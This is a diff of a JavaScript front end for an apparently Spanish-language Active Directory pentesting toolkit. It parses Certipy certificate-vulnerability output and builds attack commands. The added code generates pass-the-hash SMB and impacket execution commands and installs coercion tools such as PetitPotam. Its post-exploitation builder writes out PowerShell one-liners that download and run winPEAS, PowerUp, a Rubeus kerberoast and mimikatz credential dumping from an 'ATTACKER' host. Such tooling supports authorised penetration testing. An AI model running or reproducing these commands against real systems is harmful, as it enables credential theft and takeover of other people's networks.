+  const tp = (id, lbl, cls, active = true) => active
+    ? `<span class="p-pill ${cls}" style="cursor:pointer;user-select:none" data-adctgl="${id}" data-adclbl="${lbl}" onclick="adcToggle('${id}')">▸ ${lbl}</span>`
+    : `<span class="p-pill ${cls}" style="opacity:.4">${lbl}</span>`;
+
+  // ── Summary row ───────────────────────────────────────────
+  let o = `<div class="p-summary">`;
+  if (nTemplates !== null) o += tp('adc-d-tmpl',     nTemplates + ' templates',                          'info',  nTemplates > 0);
+  if (nEnabled   !== null) o += tp('adc-d-enabled',  nEnabled   + ' habilitados',                        nEnabled > 0 ? 'warn' : 'ok', nEnabled > 0);
+  if (nCAs       !== null) o += tp('adc-d-cas',      nCAs       + ' CAs',                                nCAs > 0 ? 'info' : 'warn',   nCAs > 0 || hasCA);
+  if (nIssuance  !== null) o += tp('adc-d-issuance', nIssuance  + ' issuance policies',                  'ok',    nIssuance > 0);
+  if (nOIDs      !== null) o += tp('adc-d-oids',     nOIDs      + ' OIDs',                               'ok',    true);
+  if (hasVulns)            o += tp('adc-d-escs',     'ESC Vulnerabilities',                              'crit',  true);
+  if (webActive.length)    o += `<span class="p-pill crit">⚠ Web Enrollment ACTIVO</span>`;
+  if (hasDNS)              o += tp('adc-d-dns',      dnsErrors.length + ' DNS error' + (dnsErrors.length !== 1 ? 's' : ''), 'warn', true);
+  if (hasFiles)            o += tp('adc-d-files',    'Archivos generados',                               'ok',    true);
+  o += `</div>`;
+
+  // ── Section builder: wraps body in a collapsible div ─────
+  // open=true → starts expanded; open=false → starts collapsed
+  const sect = (id, title, body, open = false) =>
+    `<div id="${id}" style="display:${open ? 'block' : 'none'}">${ph.sec(title, body)}</div>`;
+
+  // ── Placeholder body (while waiting for JSON) ─────────────
+  const jsonPending = (id, extra='') =>
+    savedJSON
+      ? `<div id="${id}-pl" style="color:var(--mut);font-size:12px;padding:4px 0">Cargando desde ${ph.esc(savedJSON)}…${extra}</div>`
+      : `<div style="color:var(--mut);font-size:12px;padding:4px 0">Disponible solo con JSON generado por Certipy.</div>`;
+
+  // ── ESC section — starts open if findings exist ───────────
+  {
+    const body = (escRows.length  ? ph.tbl(['FINDING', 'DETALLE'], escRows) : '') +
+                 (vulnMark.length ? vulnMark.map(v => ph.find(v, 'crit')).join('') : '') ||
+                 ph.empty('Sin findings ESC detectados en el output.');
+    o += sect('adc-d-escs', 'Vulnerabilidades ESC', body, hasVulns);
+  }
+
+  // ── CAs section ───────────────────────────────────────────
+  {
+    let body = '';
+    if (hasCA) {
+      body += caOk.map(ca  => ph.find(`<span style="color:var(--g)">✓</span>  ${ph.esc(ca)} — configuración OK`, 'ok')).join('');
+      body += caFail.map(ca => ph.find(`<span style="color:var(--red)">✗</span>  ${ph.esc(ca)} — configuración no recuperada`, 'warn')).join('');
+      if (webActive.length || webRefused.length) {
+        body += webActive.map(w  => ph.find(`<span style="color:var(--yellow)">⚠</span>  Web Enrollment ACTIVO: ${ph.esc(w)}`, 'crit')).join('');
+        body += webRefused.map(w => ph.find(`<span style="color:var(--mut)">✗</span>  ${ph.esc(w)}`, 'ok')).join('');
+      }
+      if (savedJSON) body += jsonPending('adc-cas-json', ' (detalles adicionales)');
+    } else {
+      body = jsonPending('adc-cas-json');
+    }
+    o += sect('adc-d-cas', `Certificate Authorities (${nCAs ?? caOk.length + caFail.length})`, body);
+  }
+
+  // ── All templates ─────────────────────────────────────────
+  o += sect('adc-d-tmpl',    `Todos los Templates (${nTemplates ?? '?'})`,          jsonPending('adc-tmpl-json'));
+
+  // ── Enabled templates ─────────────────────────────────────
+  o += sect('adc-d-enabled', `Templates Habilitados (${nEnabled ?? '?'})`,           jsonPending('adc-enabled-json'));
+
+  // ── Issuance policies ─────────────────────────────────────
+  o += sect('adc-d-issuance',`Issuance Policies (${nIssuance ?? '?'})`,              jsonPending('adc-issuance-json'));
+
+  // ── OIDs ─────────────────────────────────────────────────
+  {
+    const body = (nOIDs === 0)
+      ? `<div style="color:var(--mut);font-size:12px;padding:4px 0">0 OIDs vinculados a templates.</div>`
+      : jsonPending('adc-oids-json');
+    o += sect('adc-d-oids', `OIDs (${nOIDs ?? '?'})`, body);
+  }
+
+  // ── DNS / RRP errors ─────────────────────────────────────
+  if (hasDNS) {
+    const body = dnsErrors.map(h => ph.find(`DNS failed: <span style="color:var(--yellow)">${ph.esc(h)}</span>`, 'warn')).join('') +
+                 rrpFail.map(e   => ph.find(`Remote registry: <span style="color:var(--mut)">${ph.esc(e)}</span>`, 'warn')).join('');
+    o += sect('adc-d-dns', 'DNS / RRP Errors', body);
+  }
+
+  // ── Generated files ───────────────────────────────────────
+  if (hasFiles) {
+    const body = [
+      savedJSON ? ph.find(`JSON &nbsp;<code style="font-size:.85em;color:var(--cyan)">${ph.esc(savedJSON)}</code>`, 'info') : '',
+      savedTXT  ? ph.find(`TXT &nbsp;<code style="font-size:.85em;color:var(--cyan)">${ph.esc(savedTXT)}</code>`,  'info') : '',
+      savedZIP  ? ph.find(`ZIP (BloodHound) &nbsp;<code style="font-size:.85em;color:var(--cyan)">${ph.esc(savedZIP)}</code>`, 'ok')  : '',
+    ].filter(Boolean).join('');
+    o += sect('adc-d-files', 'Archivos generados', body);
+  }
+
+  // ── Fallback ──────────────────────────────────────────────
+  if (nTemplates === null && !hasCA && !hasVulns && !hasFiles) {
+    o += ph.empty('Sin resultados reconocibles de certipy find. Verifica credenciales y conectividad al DC.');
+  }
+
+  // ── Async JSON enrichment ─────────────────────────────────
+  if (savedJSON && typeof serverOk !== 'undefined' && serverOk) {
+    setTimeout(() => _adcEnrichJson(savedJSON, ['/opt/x9-evilkit', '/root', '/home', '/tmp']), 400);
+  }
+
+  return o;
+};
+
+async function _adcEnrichJson(filename, searchDirs) {
+  // ── Locate JSON file ──────────────────────────────────────
+  let jsonPath = '';
+  for (const dir of searchDirs) {
+    try {
+      const r = await fetch(API + '/tools/find-script', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({directory: dir, name: filename})
+      });
+      const d = await r.json();
+      if (d.found && d.path) { jsonPath = d.path; break; }
+    } catch(_) {}
+  }
+  if (!jsonPath) return;
+
+  // ── Read file ─────────────────────────────────────────────
+  let raw;
+  try {
+    const r = await fetch(API + '/read/file', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({path: jsonPath})
+    });
+    if (!r.ok) return;
+    raw = (await r.json()).content;
+    if (!raw) return;
+  } catch(_) { return; }
+
+  // ── Parse ─────────────────────────────────────────────────
+  let data;
+  try { data = JSON.parse(raw); } catch(_) { return; }
+
+  // ── Helper: replace a section's body content ─────────────
+  const updSec = (sectionContainerId, newBodyHtml) => {
+    const el = document.getElementById(sectionContainerId);
+    if (!el) return;
+    const body = el.querySelector('.p-sec-body');
+    if (body) body.innerHTML = newBodyHtml;
+  };
+
+  // ── Extract templates ────────────────────────────────────
+  const allTmpls  = [];
+  const enabledT  = [];
+  const vulnTmpls = [];
+  const templatesObj = data['Certificate Templates'] || {};
+
+  for (const key of Object.keys(templatesObj)) {
+    const t      = templatesObj[key];
+    const name   = t['Template Name'] || t['Display Name'] || key;
+    const on     = t['Enabled'] !== false;
+    const cas    = [].concat(t['Certificate Authorities'] || []).join(', ') || '—';
+    const ekus   = [].concat(t['Extended Key Usage'] || []).join(', ') || '—';
+    const vulns  = t['[!] Vulnerabilities'] || {};
+    const escs   = Object.keys(vulns);
+    allTmpls.push({name, on, cas, ekus, escs, vulns});
+    if (on)         enabledT.push({name, cas, ekus, escs, vulns});
+    if (escs.length) vulnTmpls.push({name, on, cas, escs, vulns});
+  }
+
+  // ── All templates section ─────────────────────────────────
+  if (allTmpls.length) {
+    const rows = allTmpls.map(t => [
+      `<span style="color:var(--cyan)">${ph.esc(t.name)}</span>`,
+      t.on ? ph.pill('ON','warn') : ph.pill('OFF','ok'),
+      ph.esc(t.cas),
+      t.escs.length
+        ? t.escs.map(e => `<span style="color:var(--red);font-weight:600">${ph.esc(e)}</span>`).join(' ')
+        : `<span style="color:var(--mut)">—</span>`,
+    ]);
+    updSec('adc-d-tmpl', ph.tbl(['TEMPLATE','ESTADO','CAs','VULNS'], rows));
+  }
+
+  // ── Enabled templates section ─────────────────────────────
+  if (enabledT.length) {
+    const rows = enabledT.map(t => [
+      `<span style="color:var(--cyan)">${ph.esc(t.name)}</span>`,
+      ph.esc(t.cas),
+      ph.esc(t.ekus.slice(0, 60)),
+      t.escs.length
+        ? t.escs.map(e => `<span style="color:var(--red);font-weight:600">${ph.esc(e)}</span>`).join(' ')
+        : `<span style="color:var(--mut)">—</span>`,
+    ]);
+    updSec('adc-d-enabled', ph.tbl(['TEMPLATE','CAs','EKUs','VULNS'], rows));
+  }
+
+  // ── ESC section — replace with full JSON detail ───────────
+  if (vulnTmpls.length) {
+    const rows = vulnTmpls.flatMap(t =>
+      t.escs.map(esc => [
+        `<span style="color:var(--red);font-weight:600">${ph.esc(esc)}</span>`,
+        `<span style="color:var(--cyan)">${ph.esc(t.name)}</span>`,
+        ph.esc(t.vulns[esc] || ''),
+        t.on ? ph.pill('ENABLED','crit') : ph.pill('DISABLED','ok'),
+      ])
+    );
+    updSec('adc-d-escs', ph.tbl(['ESC','TEMPLATE','DETALLE','ESTADO'], rows));
+  }
+
+  // ── CAs section ───────────────────────────────────────────
+  const caObj = data['Certificate Authorities'] || {};
+  const caKeys = Object.keys(caObj);
+  if (caKeys.length) {
+    let body = '';
+    for (const k of caKeys) {
+      const c = caObj[k];
+      const caName  = c['CA Name']    || k;
+      const dns     = c['DNS Name']   || '—';
+      const subject = c['Certificate Subject'] || '—';
+      const web     = c['Web Enrollment'] || '—';
+      const webOn   = /enabled|active/i.test(web);
+      body += ph.find(
+        `${webOn ? '<span style="color:var(--yellow)">⚠</span>' : '<span style="color:var(--g)">✓</span>'}` +
+        `  <b>${ph.esc(caName)}</b>` +
+        `  <span style="color:var(--mut);font-size:11px">${ph.esc(dns)}</span>` +
+        `  Web: ${webOn ? ph.pill(web,'crit') : ph.pill(web,'ok')}` +
+        `  <span style="color:var(--mut);font-size:11px">${ph.esc(subject.slice(0,60))}</span>`,
+        webOn ? 'warn' : 'ok'
+      );
+    }
+    updSec('adc-d-cas', body);
+  }
+
+  // ── Issuance policies ─────────────────────────────────────
+  const issuanceObj = data['Issuance Policies'] || {};
+  const issuanceKeys = Object.keys(issuanceObj);
+  if (issuanceKeys.length) {
+    const rows = issuanceKeys.map(k => {
+      const p = issuanceObj[k];
+      return [ph.esc(p['Name'] || k), ph.esc(p['Display Name'] || '—'), ph.esc(p['OID'] || '—')];
+    });
+    updSec('adc-d-issuance', ph.tbl(['NAME','DISPLAY NAME','OID'], rows));
+  } else if (Object.keys(templatesObj).length) {
+    updSec('adc-d-issuance', `<div style="color:var(--mut);font-size:12px;padding:4px 0">No se encontraron issuance policies en el JSON.</div>`);
+  }
+
+  // ── OIDs ─────────────────────────────────────────────────
+  const oidsObj  = data['OIDs'] || {};
+  const oidsKeys = Object.keys(oidsObj);
+  if (oidsKeys.length) {
+    const rows = oidsKeys.map(k => {
+      const o2 = oidsObj[k];
+      return [ph.esc(o2['Name'] || k), ph.esc(o2['Template'] || '—'), ph.esc(o2['OID'] || '—')];
+    });
+    updSec('adc-d-oids', ph.tbl(['NAME','TEMPLATE','OID'], rows));
+  } else if (Object.keys(templatesObj).length) {
+    updSec('adc-d-oids', `<div style="color:var(--mut);font-size:12px;padding:4px 0">0 OIDs vinculados a templates en el JSON.</div>`);
+  }
+}
 
 /* AD ENUM (enum4linux-ng, rpcclient, smbclient, ldapsearch) */
 parsers.ae = r => {
@@ -6445,19 +7470,51 @@ function bAdEnum() {
   else if(t==='rpcclient') c=`<span class="b">rpcclient</span> <span class="f">-U "${dom}\\${u}%${p}"</span> <span class="v">${dc}</span> <span class="f">-c "enumdomusers"</span>`;
   else if(t==='smbclient') c=`<span class="b">smbclient</span> <span class="f">-L //</span><span class="v">${dc}</span> <span class="f">-U '${dom}\\${u}%${p}'</span>`;
   else if(t==='ldapsearch') c=`<span class="b">ldapsearch</span> <span class="f">-x -H ldap://${dc} -D "${u}@${dom}" -w '${p}' -b "DC=${dom.replace(/\./g,',DC=')}"</span>`;
+  else if(t==='windapsearch') c=`<span class="b">windapsearch</span> <span class="f">--dc</span> <span class="v">${dc}</span> <span class="f">-d</span> <span class="v">${dom}</span> <span class="f">-u</span> <span class="v">${u}@${dom}</span> <span class="f">-p '${p}'</span> <span class="f">--computers --users --groups --full</span>`;
+  else if(t==='ldeep') c=`<span class="b">ldeep</span> <span class="f">ldap</span> <span class="f">-u</span> <span class="v">${u}</span> <span class="f">-p '${p}' -d</span> <span class="v">${dom}</span> <span class="f">-s ldap://${dc}</span> <span class="f">all</span>`;
+  else if(t==='adidnsdump') c=`<span class="b">adidnsdump</span> <span class="f">-u</span> <span class="v">'${dom}\\${u}'</span> <span class="f">-p '${p}'</span> <span class="v">${dc}</span>`;
   else c=`<span class="b">ldapdomaindump</span> <span class="f">-u '${dom}\\${u}' -p '${p}'</span> <span class="v">${dc}</span>`;
   setH('ae-cmd', c);
 }
+function smbIsHash(val) {
+  // LM:NTLM (32:32 hex) o solo NTLM (32 hex)
+  return /^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$/.test(val) || /^[a-fA-F0-9]{32}$/.test(val);
+}
+function smbNormalizeHash(val) {
+  // Si solo viene el NTLM (32 hex), añadir LM vacío estándar
+  return /^[a-fA-F0-9]{32}$/.test(val) ? `aad3b435b51404eeaad3b435b51404ee:${val}` : val;
+}
 function bSmb() {
-  const h=gv('sm-h')||'192.168.1.0/24', d=gv('sm-d')||'domain.local';
-  const u=gv('sm-u')||'user', p=gv('sm-p')||'Password1!', t=gv('sm-t'), mod=chks('sm-mod');
-  const isHash=p.includes(':');
-  let c='';
-  if(t==='smbmap') c=`<span class="b">smbmap</span> <span class="f">-H ${h} -u ${u} -p '${p}' -d ${d}</span>`;
-  else {
-    const hp=isHash?`-H ${p}`:`-p '${p}'`;
-    c=`<span class="b">${t}</span> <span class="f">smb</span> <span class="v">${h}</span> <span class="f">-u ${u} ${hp} -d ${d}</span>`;
-    if(mod.trim()) c+=` <span class="f">${mod.trim()}</span>`;
+  const h   = gv('sm-h') || '192.168.1.10';
+  const d   = gv('sm-d') || 'domain.local';
+  const u   = gv('sm-u') || 'user';
+  const p   = gv('sm-p') || 'Password1!';
+  const t   = gv('sm-t') || 'crackmapexec';
+  const mod = chks('sm-mod');
+  const hash = smbIsHash(p);
+
+  // Badge visual
+  const badge = document.getElementById('sm-cred-badge');
+  const warn  = document.getElementById('sm-hash-warn');
+  if (badge) {
+    badge.textContent   = hash ? 'NTLM HASH' : 'PASSWORD';
+    badge.style.color   = hash ? 'var(--g)'  : 'var(--mut)';
+    badge.style.borderColor = hash ? 'var(--g)' : 'var(--brd)';
+  }
+
+  let c = '';
+  if (t === 'smbmap') {
+    // smbmap: no PTH nativo — avisar si detectamos hash
+    if (warn) warn.style.display = hash ? '' : 'none';
+    // Pasar credencial tal cual (puede funcionar en entornos donde impacket subyacente acepta NTLM)
+    const credArg = hash ? `-p '${smbNormalizeHash(p)}'` : `-p '${p}'`;
+    c = `<span class="b">smbmap</span> <span class="f">-H ${h} -u ${u} ${credArg} -d ${d}</span>`;
+  } else {
+    // crackmapexec / netexec / nxc — PTH correcto con -H
+    if (warn) warn.style.display = 'none';
+    const credFlag = hash ? `-H ${smbNormalizeHash(p)}` : `-p '${p}'`;
+    c = `<span class="b">${t}</span> <span class="f">smb</span> <span class="v">${h}</span> <span class="f">-u ${u} ${credFlag} -d ${d}</span>`;
+    if (mod.trim()) c += ` <span class="f">${mod.trim()}</span>`;
   }
   setH('sm-cmd', c);
 }
@@ -6481,9 +7538,9 @@ async function bExec() {
   const u=gv('ex-u')||'Administrator', p=gv('ex-p')||'Password1!', t=gv('ex-t'), cmd=gv('ex-c');
   const isHash=p.includes(':');
   const creds=isHash?`${d}/${u}@${h} -hashes ${p}`:`${d}/${u}:'${p}'@${h}`;
-  // FIX: resolve impacket path
   const path = (await resolveImpacket(t)) || t;
   let c=`<span class="b">python3 ${path}</span> <span class="v">${creds}</span>`;
+  if(t==='dcomexec.py') c=`<span class="b">python3 ${path}</span> <span class="v">${creds}</span> <span class="f">-object MMC20</span>`;
   if(cmd) c+=` <span class="v">"${cmd}"</span>`;
   setH('ex-cmd', c);
 }
@@ -6514,6 +7571,580 @@ function bMitm() {
   }
   else c=`<span class="b">responder</span> <span class="f">-I</span> <span class="v">${iface}</span> <span class="f">-rdwv</span>`;
   setH('mt-cmd', c);
+}
+// ═══════════════════════════════════════════════════════════
+// ── TOOL INSTALL DATABASE ────────────────────────────────
+// ═══════════════════════════════════════════════════════════
+const TOOL_DB = {
+  // binary → { label, install, type }
+  'certipy':     { label:'certipy',      install:'pip3 install certipy-ad',    type:'pip' },
+  'bloodyad':    { label:'bloodyAD',     install:'pip3 install bloodyad',       type:'pip' },
+  'coercer':     { label:'Coercer',      install:'pip3 install coercer',        type:'pip' },
+  'adidnsdump':  { label:'adidnsdump',   install:'pip3 install adidnsdump',     type:'pip' },
+  'ldeep':       { label:'ldeep',        install:'pip3 install ldeep',          type:'pip' },
+  'windapsearch':{ label:'windapsearch', install:'if [ -d /opt/windapsearch ]; then git -C /opt/windapsearch pull; else git clone https://github.com/ropnop/windapsearch.git /opt/windapsearch; fi && pip3 install ldap3 gssapi 2>/dev/null && ln -sf /opt/windapsearch/windapsearch.py /usr/local/bin/windapsearch', type:'git' },
+  'evil-winrm':  { label:'evil-winrm',   install:'gem install evil-winrm',      type:'gem' },
+  'pywhisker':   { label:'pywhisker (git)',  install:'if [ -d /opt/pywhisker ]; then git -C /opt/pywhisker pull; else git clone https://github.com/ShutdownRepo/pywhisker /opt/pywhisker; fi && pip3 install -r /opt/pywhisker/requirements.txt 2>/dev/null', type:'git', path:'/opt/pywhisker/pywhisker.py', searchDir:'/opt/pywhisker', searchName:'pywhisker.py' },
+  'PetitPotam':  { label:'PetitPotam (git)', install:'if [ -d /opt/PetitPotam ]; then git -C /opt/PetitPotam pull; else git clone https://github.com/ly4k/PetitPotam /opt/PetitPotam; fi', type:'git', path:'/opt/PetitPotam/PetitPotam.py', searchDir:'/opt/PetitPotam', searchName:'PetitPotam.py' },
+  'dfscoerce':   { label:'dfscoerce (git)',  install:'if [ -d /opt/dfscoerce ]; then git -C /opt/dfscoerce pull; else git clone https://github.com/efchatz/dfscoerce /opt/dfscoerce; fi', type:'git', path:'/opt/dfscoerce/dfscoerce.py', searchDir:'/opt/dfscoerce', searchName:'dfscoerce.py' },
+};
+
+// Panel → primary tools to check
+const PANEL_TOOL_MAP = {
+  'ad-acl':     ['bloodyad', 'pywhisker'],
+  'ad-coerce':  ['coercer', 'PetitPotam', 'dfscoerce'],
+  'ad-cert':    ['certipy'],
+  'ad-tickets': ['getTGT.py'],
+  'ad-winrm':   ['evil-winrm'],
+};
+// Panel → t-bar element ID
+const PANEL_TBAR = {
+  'ad-acl':'acl-tbar', 'ad-coerce':'crc-tbar', 'ad-cert':'adc-tbar',
+  'ad-tickets':'tkt-tbar', 'ad-winrm':'ew-tbar',
+};
+
+async function checkPanelTools(panelId) {
+  if (!serverOk) return;
+  const tools = PANEL_TOOL_MAP[panelId];
+  const barId = PANEL_TBAR[panelId];
+  if (!tools || !barId) return;
+  const bar = document.getElementById(barId);
+  if (!bar) return;
+  bar.innerHTML = '<div class="t-dot"></div><span class="t-name" style="color:var(--mut)">verificando...</span>';
+  bar.className = 't-bar';
+  const results = [];
+  for (const tool of tools) {
+    const info = TOOL_DB[tool];
+    let found = false;
+    try {
+      if (info && info.path) {
+        const r = await fetch(API + '/validate/file', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({path: info.path}) });
+        found = (await r.json()).exists;
+      } else {
+        const r = await fetch(API + '/check', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({tool}) });
+        found = (await r.json()).found;
+      }
+    } catch(_) {}
+    results.push({ tool, found, info });
+  }
+  const allOk = results.every(r => r.found);
+  bar.className = 't-bar ' + (allOk ? 'ok' : 'missing');
+  const missing = results.filter(r => !r.found);
+  const ok = results.filter(r => r.found);
+  let html = '<div class="t-dot"></div>';
+  if (allOk) {
+    html += `<span class="t-name">✓ ${results.map(r=>r.tool).join(', ')}</span>`;
+  } else {
+    html += `<span class="t-name">✗ falta: ${missing.map(r=>r.info?.label||r.tool).join(', ')}`;
+    if (ok.length) html += ` &nbsp;<span style="color:var(--g);font-size:10px">✓ ${ok.map(r=>r.tool).join(', ')}</span>`;
+    html += '</span>';
+    for (const { tool, info } of missing) {
+      if (info && info.install) {
+        const eid = 'ibtn-' + tool.replace(/[^a-z0-9]/gi,'_');
+        html += `<button class="ibtn" id="${eid}" onclick="installTool('${tool}','${info.install.replace(/'/g,"\\'")}','${barId}','${eid}')">⬇ ${info.label||tool}</button>`;
+      }
+    }
+  }
+  bar.innerHTML = html;
+}
+
+async function installTool(toolId, installCmd, barId, btnId) {
+  const btn = document.getElementById(btnId);
+  if (btn) { btn.className = 'ibtn spin'; btn.textContent = '⟳ instalando...'; }
+  termWrite('t0', `[install] ${toolId}: ${installCmd}`, 'cmd');
+  const job_id = 'install_' + toolId + '_' + Date.now();
+  try {
+    const resp = await fetch(API + '/run', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ cmd: installCmd, cwd: '/tmp' })
+    });
+    const { job_id: jid, error } = await resp.json();
+    if (error) { if(btn){btn.className='ibtn';btn.textContent='✗ error';} return; }
+    const es = new EventSource(API + '/stream/' + jid);
+    es.onmessage = async (e) => {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'output') termWrite('t0', msg.data.trimEnd());
+      else if (msg.type === 'done') {
+        es.close();
+        if (msg.code === 0) {
+          // For git tools with a known path, verify the file actually exists
+          const info = TOOL_DB[toolId];
+          if (info && info.path) {
+            crcInvalidate(toolId); // clear any stale cache entry
+            let realPath = '';
+            try {
+              const vr = await fetch(API + '/validate/file', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({path: info.path}) });
+              const vd = await vr.json();
+              if (vd.exists) {
+                realPath = info.path;
+              } else if (info.searchDir && info.searchName) {
+                // File not at expected path — search for it
+                const fr = await fetch(API + '/tools/find-script', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({directory: info.searchDir, name: info.searchName}) });
+                const fd = await fr.json();
+                if (fd.found && fd.path) { realPath = fd.path; info.path = fd.path; }
+              }
+            } catch(_) {}
+            if (realPath) {
+              if (btn) { btn.className='ibtn done'; btn.textContent='✓ listo'; }
+              termWrite('t0', `[✓] ${toolId} instalado → ${realPath}`, 'ok');
+            } else {
+              if (btn) { btn.className='ibtn'; btn.textContent='✗ no encontrado'; }
+              termWrite('t0', `[✗] ${toolId}: git clone OK pero archivo no encontrado en ${info.path}`, 'err');
+            }
+          } else {
+            if (btn) { btn.className='ibtn done'; btn.textContent='✓ listo'; }
+            termWrite('t0', `[✓] ${toolId} instalado`, 'ok');
+          }
+          setTimeout(() => checkPanelTools(Object.keys(PANEL_TBAR).find(k=>PANEL_TBAR[k]===barId)||''), 800);
+          // Refresh coerce command if the installed tool was a coerce tool
+          if (['coercer','PetitPotam','dfscoerce'].includes(toolId)) {
+            setTimeout(() => bCoerce(), 1000);
+          }
+        } else {
+          if (btn) { btn.className='ibtn'; btn.textContent='✗ falló'; }
+          termWrite('t0', `[✗] instalación fallida (code ${msg.code})`, 'err');
+        }
+      }
+    };
+    es.onerror = () => { es.close(); if(btn){btn.className='ibtn';btn.textContent='✗ error';} };
+  } catch(e) {
+    if (btn) { btn.className='ibtn'; btn.textContent='✗ error'; }
+  }
+}
+
+// Renders the AD tools install grid in the tools panel
+async function renderAdInstallGrid() {
+  const grid = document.getElementById('ad-tools-install');
+  if (!grid || !serverOk) return;
+  grid.innerHTML = '';
+  for (const [toolId, info] of Object.entries(TOOL_DB)) {
+    let found = false;
+    try {
+      if (info.path) {
+        const r = await fetch(API + '/validate/file', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({path: info.path}) });
+        found = (await r.json()).exists;
+      } else {
+        const r = await fetch(API + '/check', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({tool: toolId}) });
+        found = (await r.json()).found;
+      }
+    } catch(_) {}
+    const eid = 'grid-ibtn-' + toolId.replace(/[^a-z0-9]/gi,'_');
+    const barId = 'ad-tools-install';
+    const cell = document.createElement('div');
+    cell.className = 'tc';
+    cell.style.display = 'flex';
+    cell.style.alignItems = 'center';
+    cell.style.gap = '6px';
+    cell.style.padding = '5px 8px';
+    const dot = document.createElement('div');
+    dot.className = 'ts ' + (found ? 'ok' : 'err');
+    cell.appendChild(dot);
+    const name = document.createElement('span');
+    name.className = 'tn';
+    name.style.flex = '1';
+    name.style.fontSize = '12px';
+    name.textContent = info.label || toolId;
+    cell.appendChild(name);
+    if (!found) {
+      const typeSpan = document.createElement('span');
+      typeSpan.textContent = info.type || 'pip';
+      typeSpan.style.cssText = 'font-size:10px;color:var(--dim);margin-right:4px';
+      cell.appendChild(typeSpan);
+      const btn = document.createElement('button');
+      btn.id = eid;
+      btn.className = 'ibtn';
+      btn.textContent = '⬇ instalar';
+      btn.onclick = () => installTool(toolId, info.install, barId, eid);
+      cell.appendChild(btn);
+    }
+    grid.appendChild(cell);
+  }
+}
+
+function pipInstallAllAD() {
+  const pkgs = Object.values(TOOL_DB).filter(t=>t.type==='pip').map(t=>t.install.replace('pip3 install ','')).join(' ');
+  execDirect('pip3 install ' + pkgs);
+}
+
+// Note: checkPanelTools() is called from sw() below via _adPanelCheck()
+
+// ── POST-EXPLOIT builders ─────────────────────────────────
+function bPostex() {
+  const lh  = gv('px-lh') || 'ATTACKER';
+  const port = gv('px-port') || '8080';
+  const dir  = gv('px-dir') || '/opt/post-exploit';
+  const url  = `http://${lh}:${port}`;
+  // HTTP server command
+  setH('px-srv-cmd', `<span class="b">python3</span> <span class="f">-m http.server</span> <span class="v">${port}</span> <span class="f">--directory</span> <span class="v">${dir}</span>`);
+  // Delivery per tab
+  const tab = document.querySelector('#p-ad-postex .tab.on');
+  const t = tab ? tab.textContent.trim().toLowerCase() : 'winpeas';
+  if (document.getElementById('px-wp-cmd'))
+    setH('px-wp-cmd', `<span class="b">powershell</span> <span class="f">-ep bypass -c</span> <span class="v">"iwr ${url}/winPEASx64.exe -o $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe"</span>`);
+  if (document.getElementById('px-pu-cmd'))
+    setH('px-pu-cmd', `<span class="b">powershell</span> <span class="f">-ep bypass -c</span> <span class="v">"IEX(IWR '${url}/PowerUp.ps1' -UseBasicParsing); Invoke-AllChecks"</span>`);
+  if (document.getElementById('px-sb-cmd'))
+    setH('px-sb-cmd', `<span class="b">powershell</span> <span class="f">-ep bypass -c</span> <span class="v">"iwr ${url}/Seatbelt.exe -o $env:TEMP\\sb.exe; & $env:TEMP\\sb.exe -group=all"</span>`);
+  if (document.getElementById('px-rb-cmd'))
+    setH('px-rb-cmd', `<span class="b">powershell</span> <span class="f">-ep bypass -c</span> <span class="v">"iwr ${url}/Rubeus.exe -o $env:TEMP\\rb.exe; & $env:TEMP\\rb.exe kerberoast /outfile:$env:TEMP\\hashes.txt"</span>`);
+  if (document.getElementById('px-mm-cmd'))
+    setH('px-mm-cmd', `<span class="b">powershell</span> <span class="f">-ep bypass -c</span> <span class="v">"iwr ${url}/mimikatz.exe -o $env:TEMP\\mimi.exe; & $env:TEMP\\mimi.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"</span>`);
+}
+function pxMkdir() {
+  const dir = gv('px-dir') || '/opt/post-exploit';
+  execDirect(`mkdir -p '${dir}'`);
+}
+function pxDownloadAll() {
+  const dir = gv('px-dir') || '/opt/post-exploit';
+  const cmds = [
+    `mkdir -p '${dir}'`,
+    `wget -qO '${dir}/winPEASx64.exe' https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe 2>/dev/null || echo '[skip] winPEAS'`,
+    `wget -qO '${dir}/winPEAS.ps1' https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1 2>/dev/null || echo '[skip] winPEAS.ps1'`,
+    `wget -qO '${dir}/PowerUp.ps1' https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 2>/dev/null || echo '[skip] PowerUp'`,
+    `echo '[!] Seatbelt/Rubeus/Mimikatz requieren compilacion — coloca los .exe manualmente en ${dir}'`,
+  ].join(' && ');
+  execDirect(cmds);
+}
+
+// ── ACL ABUSE ────────────────────────────────────────────
+function aclSwitch() {
+  const t = gv('acl-t');
+  ['dacledit','owneredit','bloodyad','pywhisker'].forEach(k => {
+    const el = document.getElementById('acl-sec-' + k);
+    if (el) el.style.display = (k === t) ? '' : 'none';
+  });
+  if (t === 'bloodyad') aclBldSwitch();
+  if (t === 'pywhisker') aclPwSwitch();
+  bAcl();
+}
+
+function aclDaclActSwitch() {
+  const act = gv('acl-dacl-act').split(' ')[0];
+  document.getElementById('acl-dacl-rights-grp').style.display = (act === 'write') ? '' : 'none';
+  document.getElementById('acl-dacl-princ-grp').style.display = (act === 'write' || act === 'remove') ? '' : 'none';
+  bAcl();
+}
+
+function aclOwnActSwitch() {
+  document.getElementById('acl-own-newowner-grp').style.display = (gv('acl-own-act').startsWith('write')) ? '' : 'none';
+  bAcl();
+}
+
+function aclBldSwitch() {
+  const cmd = gv('acl-bld-cmd');
+  const a1l = document.getElementById('acl-bld-a1l');
+  const a1 = document.getElementById('acl-bld-a1');
+  const a2w = document.getElementById('acl-bld-a2w');
+  const a2l = document.getElementById('acl-bld-a2l');
